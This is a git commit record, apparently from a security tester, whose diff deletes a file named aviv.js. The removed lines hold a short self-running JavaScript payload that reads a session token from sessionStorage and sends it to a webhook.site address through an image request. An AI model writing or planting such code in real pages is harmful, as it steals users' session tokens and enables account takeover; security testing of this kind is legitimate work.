ce24a7e466017025892be6a6e63f9a8c984de23d
aviv-terra <aviv@terra.security>
2025-07-10 17:56:18 +0300

    Delete aviv.js

--- aviv.js
+++
@@ -1,9 +0,0 @@
-(function () {
-  try {
-    const token = sessionStorage.getItem('bigIdTokenID') || 'no-token';
-    const i = new Image();
-    i.src = 'https://webhook.site/f1cdc770-5004-423d-b29c-f234fca2b8a8?c=' + encodeURIComponent(token);
-  } catch (e) {
-    console.error('Payload error:', e);
-  }
-})();
